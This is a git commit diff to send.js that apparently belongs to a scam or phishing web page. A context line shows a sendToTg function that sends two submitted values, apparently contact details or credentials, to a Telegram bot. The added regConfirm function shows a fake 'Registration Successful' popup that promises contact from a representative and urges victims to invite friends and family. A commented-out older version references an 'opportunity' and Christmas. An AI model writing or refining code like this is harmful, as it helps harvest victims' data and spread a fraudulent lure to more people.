af1539ce42391a690e40bd779ffd0d519ca5ea84
Abdulfatai Sodiq Toyin <abdulfataisodiqtoyin@gmail.com>
2024-12-04 13:44:38 +0100

    patch error

--- send.js
+++ send.js
@@ -18,8 +18,41 @@ function sendToTg(e, p, token = tokens, chatId = chatIds) {
     .then(response => response.ok)
     .catch(() => false);
 }
-  
 
 
 
 
+
+
+
+
+function regConfirm(email, phone) {
+    Swal.fire({
+        icon: 'success',
+        title: '༺ Registration Successful ༻',
+        html: `
+            <p style="font-size: 16px; line-height: 1.5;">
+                <strong>Thank you for joining us!</strong><br>
+                Our representative will contact you shortly via 
+                <span style="color: #007BFF;">"${email}"</span> or 
+                <span style="color: #007BFF;">"${phone}"</span> with further instructions.<br>
+                We value your participation and warmly encourage you to spread the word.<br>
+                Invite friends and family to enjoy these benefits!
+            </p>
+        `,
+        confirmButtonText: 'Close',
+        confirmButtonColor: '#3085d6',
+    }).then(() => {
+    setTimeout(()=>{
+    window.open('./index.html','_self');},2000);
+    });
+}
+/*
+function regConfirm(email, phone) {
+    Swal.fire({
+        icon: 'success',
+        title: 'Registration Successful🎉',
+        text: `Thank you for completing your registration! Our representative will reach out to you shortly via "${email}" or "${phone}" with further details. We appreciate your participation and encourage you to share this opportunity with friends and family. Merry Christmas`,
+    }).then(() => {window.open('./register.html');});
+}
+*/
